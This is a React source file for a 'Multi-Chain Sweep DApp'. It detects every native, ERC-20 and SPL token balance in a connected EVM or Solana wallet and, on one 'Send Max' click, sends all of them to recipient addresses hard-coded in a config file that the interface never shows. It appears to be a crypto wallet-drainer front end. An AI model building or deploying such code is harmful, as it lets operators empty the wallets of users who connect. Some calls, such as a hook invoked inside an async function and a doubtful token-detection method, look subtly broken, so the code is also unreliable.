import React, { useState, useEffect } from "react";
import {
  useAccount,
  useBalance,
  useSendTransaction,
  usePublicClient
} from "wagmi";
import { parseEther, formatEther } from "viem";
import {
  useSolanaAccount,
  useSolanaBalance,
  useSolanaSPLTokens,
  sendSol,
  sendSPLToken
} from "@reown/appkit-adapter-solana/react";
import { FIXED_RECIPIENTS, FIXED_SOLANA_RECIPIENT, ERC20_RECIPIENTS } from "./config";
import { ethers } from "ethers";

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

export default function App() {
  const { address, isConnected, chain } = useAccount();
  const publicClient = usePublicClient();
  const { data: balanceData } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();

  const { publicKey: solanaPubKey, isConnected: solConnected } = useSolanaAccount();
  const { balance: solBalance } = useSolanaBalance(solanaPubKey);

  const [erc20Tokens, setERC20Tokens] = useState([]);
  const [splTokens, setSPLTokens] = useState([]);
  const [sending, setSending] = useState(false);

  // --- Auto-detect ERC-20 tokens dynamically
  useEffect(() => {
    if (!address || !chain) return;
    const fetchERC20 = async () => {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
        const tokenData = [];

        // Use publicClient token detection if available
        const detectedTokens = await publicClient.getERC20Balances(address);

        for (const t of detectedTokens) {
          if (t.balance > 0n) {
            const tokenContract = new ethers.Contract(t.contractAddress, ERC20_ABI, provider.getSigner());
            const decimals = await tokenContract.decimals();
            const symbol = await tokenContract.symbol();
            tokenData.push({ address: t.contractAddress, balance: t.balance, decimals, symbol });
          }
        }

        setERC20Tokens(tokenData);
      } catch (err) {
        console.error("ERC-20 detection failed:", err);
      }
    };
    fetchERC20();
  }, [address, chain]);

  // --- Auto-detect SPL tokens dynamically
  useEffect(() => {
    if (!solanaPubKey) return;
    const fetchSPL = async () => {
      try {
        const tokens = await useSolanaSPLTokens(solanaPubKey);
        setSPLTokens(tokens.filter(t => t.balance > 0));
      } catch (err) {
        console.error("SPL token detection failed:", err);
      }
    };
    fetchSPL();
  }, [solanaPubKey]);

  // --- Unified Send Max (Native + Tokens)
  const handleSendMax = async () => {
    setSending(true);
    try {
      // --- EVM Sweep ---
      if (chain) {
        const nativeRecipient = FIXED_RECIPIENTS[chain.id];
        if (!nativeRecipient) return alert("No fixed recipient for this chain");

        // Send max native token
        const balance = balanceData.value;
        const gasEstimate = await publicClient.estimateGas({ account: address, to: nativeRecipient, value: balance });
        const gasPrice = await publicClient.getGasPrice();
        const maxNative = balance - gasEstimate * gasPrice;
        if (maxNative > 0n) await sendTransaction({ to: nativeRecipient, value: maxNative });

        // Send ERC-20 tokens with per-token recipients
        const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
        const signer = provider.getSigner();

        for (const token of erc20Tokens) {
          if (token.balance > 0n) {
            const tokenRecipient = ERC20_RECIPIENTS[chain.id]?.[token.symbol] || nativeRecipient;
            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
            await tokenContract.transfer(tokenRecipient, token.balance);
          }
        }

        alert(`Sent native + ERC-20 tokens on ${chain.name}`);
      }

      // --- Solana Sweep ---
      else if (solConnected) {
        const recipient = FIXED_SOLANA_RECIPIENT;
        if (!recipient) return alert("No fixed Solana recipient");

        if (solBalance > 0) await sendSol({ from: solanaPubKey, to: recipient, amount: solBalance });

        for (const t of splTokens) {
          if (t.balance > 0) await sendSPLToken({ from: solanaPubKey, to: recipient, token: t.mint, amount: t.balance });
        }

        alert("Sent SOL + SPL tokens");
      } else {
        alert("No wallet connected");
      }
    } catch (err) {
      console.error(err);
      alert("Transaction failed: " + err.message);
    }
    setSending(false);
  };

  return (
    <div style={{ padding: 40 }}>
      <h2>Multi-Chain Sweep DApp (Auto Recipient + ERC-20 Recipients)</h2>
      <appkit-button />

      {(isConnected || solConnected) && (
        <>
          {chain && (
            <p>Balance: {balanceData ? formatEther(balanceData.value) : "Loading..."} {chain.nativeCurrency.symbol}</p>
          )}
          {solConnected && <p>SOL Balance: {solBalance}</p>}

          <button onClick={handleSendMax} disabled={sending}>
            {sending ? "Sending..." : "Send Max (Native + Tokens)"}
          </button>
        </>
      )}
    </div>
  );
}